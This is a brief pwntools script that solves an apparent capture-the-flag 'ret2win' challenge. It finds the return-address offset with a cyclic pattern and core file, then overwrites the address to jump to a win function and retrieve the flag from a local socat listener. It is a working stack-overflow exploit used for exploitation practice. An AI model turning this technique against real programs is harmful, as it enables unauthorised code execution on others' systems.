from pwn import *

#use the following command to have the binary listening on localhost:1234
#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./ret2win

LOCATION = "./ret2win"
REMOTE   = remote("localhost", 1234) # binary listening on the machine
binary = ELF(LOCATION)

def pcOffset(): 
    proc = process(LOCATION, timeout=2) # start process to fuzz
    proc.sendline(cyclic(1024, n=8))    # crash process with cyclic pattern
    proc.recvall()                      
    core = Core("core")                 # open core file
    pcOff = cyclic_find(core.pc, n=8)   # find RIP offset using cyclic finder
    return 'A' * pcOff

def exploit():
    exp  = pcOffset()                     # overflow buffer
    exp += p64(binary.symbols["ret2win"]) # overwrite RIP with ret2win() address taken from binary 
    REMOTE.recvuntil('>')
    REMOTE.sendline(exp)                  # send exploit
    REMOTE.recvuntil(":")
    log.success("Flag: {0}".format(REMOTE.recv()))

exploit()

